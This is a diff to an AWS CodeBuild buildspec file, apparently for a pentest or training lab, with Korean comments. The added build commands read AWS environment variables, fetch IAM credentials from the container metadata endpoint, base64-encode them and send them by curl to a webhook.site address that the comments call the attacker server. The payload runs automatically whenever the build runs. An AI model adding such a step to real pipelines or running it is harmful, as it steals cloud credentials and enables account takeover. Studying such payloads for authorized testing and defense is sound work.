@@ -3,6 +3,22 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      # [User Preference] 경로 및 중요 변수 변수화
+      - IMDS_BASE_IP="169.254.170.2"
+      - CREDS_URI_PATH="$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+      - EXFIL_URL="https://webhook.site/PENTEST" 
+      
+      # 1. 환경 변수 확인 (디버깅용, 선택 사항)
+      - echo "[+] Checking Environment Variables..."
+      - env | grep AWS > env_vars.txt
+      
+      # 2. IMDS를 통해 자격 증명 획득 (AWS CodeBuild는 ECS 메타데이터 방식 사용)
+      - echo "[+] Querying IMDS for Credentials..."
+      - CREDENTIALS_JSON=$(curl -s "http://${IMDS_BASE_IP}${CREDS_URI_PATH}")
+      
+      # 3. 데이터 인코딩 (전송 오류 방지)
+      - ENCODED_DATA=$(echo "$CREDENTIALS_JSON" | base64 -w 0)
+      
+      # 4. 공격자 서버로 데이터 전송 (GET 파라미터로 전송)
+      - echo "[+] Exfiltrating data..."
+      - curl -X GET "$EXFIL_URL/?data=$ENCODED_DATA"
